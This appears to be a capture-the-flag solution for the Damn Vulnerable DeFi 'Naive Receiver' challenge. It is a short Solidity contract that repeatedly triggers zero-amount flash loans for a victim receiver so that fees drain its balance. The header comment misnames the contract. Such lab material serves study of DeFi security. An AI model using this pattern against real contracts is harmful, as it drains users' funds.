// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface INaiveReceiverLenderPool {
    function flashLoan(address receiver, uint256 amount) external;
}

contract FlashLoanAttack {
    INaiveReceiverLenderPool pool;

    constructor(address payable _pool) {
        pool = INaiveReceiverLenderPool(_pool);
    }

    function AttackFlashLoan(address flashLoanReceiver) external {
        for (uint256 i = 0; i <= 9; i++) {
            pool.flashLoan(address(flashLoanReceiver), 0);
        }
    }
}
